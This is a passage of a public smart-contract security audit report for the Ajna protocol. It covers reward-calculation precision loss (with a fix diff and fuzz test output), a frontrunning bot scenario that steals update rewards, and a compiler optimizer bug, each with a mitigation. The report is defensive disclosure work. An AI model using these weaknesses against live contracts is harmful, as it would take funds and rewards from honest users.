class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit CalculateReward(rewards_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    event CalculateReward(uint256);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /** @notice Utility method to transfer `Ajna` rewards to the sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      *  @dev   This method is used to transfer rewards to the `msg.sender` after a successful claim or update.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      *  @dev   It is used to ensure that rewards claimers will be able to claim some portion of the remaining tokens if a claim would exceed the remaining contract balance.</span></span></span></code></pre>\n<p>Modify reward calculation</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 421940f..4cdfefa 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -792,13 +792,15 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 (, , , uint256 bucketDeposit, ) = IPool(pool_).bucketInfo(bucketIndex_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 uint256 burnFactor     = Maths.wmul(totalBurned_, bucketDeposit);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                uint256 interestFactor = interestEarned_ == 0 ? 0 : Maths.wdiv(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    interestEarned_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // calculate rewards earned for updating bucket exchange rate </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                rewards_ += interestEarned_ == 0 ? 0 : Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wdiv(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    Maths.wmul(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        burnFactor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    interestEarned_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"shell\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testClaimRewardsFuzzy -vvvv</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">For a Fuzzing input:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">indexes: 3</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">mintAmount: 73528480588506366763626</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Divide first and multiply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">emit CalculateReward(: 334143554965844407584)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Multiply first and divide</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">emit CalculateReward(: 334143554965846586903)</span></span></code></pre>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As modified above, multiply first and then divide.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/394#issuecomment-1555151437\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-potential-unfair-distribution-of-rewards-due-to-mev-in-updatebucketexchangeratesandclaim\" style=\"position:relative;\"><a href=\"#m-04-potential-unfair-distribution-of-rewards-due-to-mev-in-updatebucketexchangeratesandclaim\" aria-label=\"m 04 potential unfair distribution of rewards due to mev in updatebucketexchangeratesandclaim permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/373\">[M-04] Potential unfair distribution of Rewards due to MEV in <code>updateBucketExchangeRatesAndClaim</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/373\">bytes032</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/328\">patitonar</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/84\">troublor</a></em></p>\n<p>This vulnerability allows malicious actors to exploit the reward system by frontrunning transactions and unfairly claiming rewards, thereby disincentivizing honest users from updating the bucket exchange rates and contributing to the system.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>updateBucketExchangeRatesAndClaim</code> function is publicly callable and serves two main purposes:</p>\n<ol>\n<li>Updates the exchange rate of a list of buckets.</li>\n<li>If eligible, the caller can claim <code>5%</code> of the rewards accumulated to each bucket since the last burn event, if it hasn’t already been updated.</li>\n</ol>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-core/src/RewardsManager.sol#L310-L318\">https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-core/src/RewardsManager.sol#L310-L318</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateBucketExchangeRatesAndClaim</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexes_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updateReward</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">updateReward</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_updateBucketExchangeRates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer rewards to sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_transferAjnaRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">updateReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>So, to summarize it’s primary purpose is to incentivize people who keep the state updated. However, given the nature of the function (first come, first serve) it becomes very prone to MEV.</p>\n<p>Consider the following scenario:</p>\n<ol>\n<li>Alice is hard-working, non-technical and constantly keeps track of when to update the buckets so she can claim a small reward. Unfortunately, she becomes notorious for getting most of the rewards from updating the bucket exchange rate.</li>\n<li>A malicious actor spots Alice’s recent gains and creates a bot to front run <strong>any</strong> transactions to RewardsManager’s <code>_updateBucketExchangeRateAndCalculateRewards</code>submitted by Alice.</li>\n<li>The day after that, Alice again see’s theres a small reward to claim, attempts to claim it, but she gets front runned by whoever set the bot.</li>\n<li>Since Alice is non-technical, she cannot ever beat the bot so she is left with a broken heart and no longer able to claim rewards.</li>\n</ol>\n<p>I believe the system should be made fair to everybody that wants to contribute, hence this is a vulnerability that should be taken care of to ensure the fair distribution of awards to people who care about the protocol instead of .</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I see potentially two solutions here:</p>\n<ol>\n<li>Introduce a randomized reward mechanism, such as a lottery system or a probabilistic reward distribution for people who contribute to updating buckets. This could reduce the predictability of rewards and hence the potential for MEV exploitation.</li>\n<li>Consider limiting the reward claim process to users who have staked in the rewards manager because they are the individuals that are directly affected if the bucket is not updated, because if its not updated for 14 days they won’t be getting rewards. Additionally, you can couple it with a rate-limitting mechanism by implementing a maximum claim per address per time period</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/373#issuecomment-1571025508\">MikeHathaway (Ajna) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-05-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication\" style=\"position:relative;\"><a href=\"#m-05-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication\" aria-label=\"m 05 calculating new rewards is susceptible to precision loss due to division before multiplication permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/367\">[M-05] Calculating new rewards is susceptible to precision loss due to division before multiplication</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/367\">cryptostellar5</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/136\">ladboy233</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/125\">Bauchibred</a></em></p>\n<p>This issue is similar to <a href=\"https://github.com/ajna-finance/audits/blob/main/sherlock/Contest1.md#issue-m-7-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication\">https://github.com/ajna-finance/audits/blob/main/sherlock/Contest1.md#issue-m-7-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication</a> which is not fixed properly. Still, the final multiplication is being performed after the division.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Rewards may be lost (0) due to division before multiplication precision issues.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>RewardsManager._calculateNewRewards</code> function calculates the new rewards for a staker by first multiplying <code>interestEarned_</code> by <code>totalBurnedInPeriod</code> and then dividing by <code>totalInterestEarnedInPeriod</code> and then again multiplying by <code>REWARD_FACTOR</code>.</p>\n<p>Since the division is being performed before the final multiplication, this can lead to precision loss.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateNewRewards</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ajnaPool_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interestEarned_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextEpoch_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsClaimedInEpoch_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRewards_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// total interest accumulated by the pool over the claim period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBurnedInPeriod</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// total tokens burned over the claim period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalInterestEarnedInPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">_getPoolAccumulators</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaPool_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextEpoch_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">epoch_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate rewards earned </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newRewards_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalInterestEarnedInPeriod</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">REWARD_FACTOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wdiv</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interestEarned_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalBurnedInPeriod</span><span class=\"mtk1\">), </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalInterestEarnedInPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>All the multiplication should be performed in step 1 and then division at the end.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/367#issuecomment-1555143862\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-06-an-optimizer-bug-in-positionmanagergetpositionindexesfiltered\" style=\"position:relative;\"><a href=\"#m-06-an-optimizer-bug-in-positionmanagergetpositionindexesfiltered\" aria-label=\"m 06 an optimizer bug in positionmanagergetpositionindexesfiltered permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/306\">[M-06] An Optimizer Bug in <code>PositionManager.getPositionIndexesFiltered</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/306\">sces60107</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3</a></p>\n<p>There is an optimizer bug in <code>PositionManager.getPositionIndexesFiltered</code>.<br>\n<a href=\"https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/\">https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/</a></p>\n<p>The Yul optimizer considers all memory writes in the outermost Yul block that are never read from as unused and removes them. The bug is fixed in solidity 0.8.15. But <code>PositionManager.sol</code> uses solidity 0.8.14.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There is an inline assembly block at the end of <code>PositionManager.getPositionIndexesFiltered</code>. The written memory is never read from in the same assembly block. It would trigger the bug to remove the memory write.<br>\n<a 